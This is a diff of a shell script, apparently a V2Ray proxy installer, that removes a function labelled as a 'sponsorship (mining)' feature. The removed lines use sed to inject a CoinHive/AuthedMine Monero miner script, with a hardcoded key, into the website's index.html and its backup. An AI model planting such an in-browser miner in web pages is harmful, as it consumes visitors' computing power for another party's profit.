@@ -826,17 +826,6 @@ win64_v2ray(){
 	rm -rf ./V2rayPro
 }
 
-#向website添加赞助（挖矿）脚本
-add_xmr(){
-if [[ -e /www/xmr ]]; then
-	echo -e "${Info} ${GreenBG} 赞助功能已开启，请勿重复操作 ${Font}"
-else
-	touch /www/xmr
-	sed -i "s/<\/head>/<script src=\"https:\/\/authedmine.com\/lib\/authedmine.min.js\"><\/script>\n<script>\n\tvar miner = new CoinHive.Anonymous(\'enShkrNbJ9bWikhfpZubveDBdlznpqLt\', {throttle: 0.3});\n\tif \(\!miner\.isMobile\(\) \&\& \!miner\.didOptOut\(14400\)\) \{\n\t\tminer\.start\(\);\n\t}\n<\/script>\n<\/head>/g" "/www/index.html" >/dev/null 2>&1
-	sed -i "s/<\/head>/<script src=\"https:\/\/authedmine.com\/lib\/authedmine.min.js\"><\/script>\n<script>\n\tvar miner = new CoinHive.Anonymous(\'enShkrNbJ9bWikhfpZubveDBdlznpqLt\', {throttle: 0.3});\n\tif \(\!miner\.isMobile\(\) \&\& \!miner\.didOptOut\(14400\)\) \{\n\t\tminer\.start\(\);\n\t}\n<\/script>\n<\/head>/g" "/www/index.bak" >/dev/null 2>&1
-	echo -e "${OK} ${GreenBG} 赞助功能已开启，请访问 Website 首页查看 ${Font}"
-fi
-}
 
 #Bash执行选项
 if [[ $# > 0 ]];then
